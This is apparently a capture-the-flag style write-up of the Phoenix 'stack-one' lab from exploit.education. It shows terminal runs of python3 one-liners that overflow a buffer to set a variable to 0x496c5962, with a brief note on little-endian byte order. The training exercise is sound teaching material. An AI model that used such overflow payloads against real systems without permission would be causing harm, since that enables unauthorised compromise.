### Stack One
This one basically wants us to know that the ordering gets changed when data is inserted. What I mean is, lowermemory address has lower data and upper memory address has upper data. 

This is why bYlI is actually 496x5962 
```
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ ./stack-one $(python3 -c "print('A'*65)")    
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000041, we want 0x496c5962
                                                                                                                                                       
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ ./stack-one $(python3 -c "print('AB'*33)")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00004241, we want 0x496c5962
                                                                                                                                                       
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ ./stack-one $(python3 -c "print('A'*64+'IlY2')")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x32596c49, we want 0x496c5962
                                                                                                                                                       
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ ./stack-one $(python3 -c "print('A'*63+'IlY2')")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x0032596c, we want 0x496c5962
                                                                                                                                                       
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ ./stack-one $(python3 -c "print('A'*63+'IlYb')")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x0062596c, we want 0x496c5962
                                                                                                                                                       
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ ./stack-one $(python3 -c "print('A'*64+'IlYb')")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
                                                                                                                                                       
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ ./stack-one $(python3 -c "print('A'*64+'lIbY')")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x5962496c, we want 0x496c5962
                                                                                                                                                       
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ ./stack-one $(python3 -c "print('A'*64+'bYlI')")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
                                                                                                                                                       
┌──(vagrant㉿kali)-[/opt/phoenix/amd64]
└─$ 


```
